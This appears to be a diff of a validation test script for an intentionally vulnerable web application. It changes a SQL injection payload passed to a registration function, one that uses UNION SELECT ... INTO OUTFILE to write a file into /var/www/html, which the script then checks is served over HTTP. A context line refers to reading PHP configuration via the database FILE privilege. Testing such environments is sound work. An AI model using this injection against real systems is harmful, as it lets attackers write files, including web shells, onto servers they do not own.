@@ -62,7 +62,7 @@ print("PASS: real PHP runtime configuration readable through database FILE privi
 file_name = os.environ.get("VALIDATION_TEST_FILENAME", "validation-probe-ci.txt")
 plain_text = "validation-into-outfile-" + secrets.token_hex(4)
 value = plain_text.encode().hex()
-register("Belgium' UNION SELECT 0x" + value + " INTO OUTFILE '/var/www/html/" + file_name + "'-- -")
+register("NoRegisteredCountry' UNION SELECT 0x" + value + " INTO OUTFILE '/var/www/html/" + file_name + "'-- -")
 _, output = visit("/" + file_name)
 assert output.strip() == plain_text
 print("PASS: native MariaDB INTO OUTFILE creates an HTTP-served ordinary text file", flush=True)
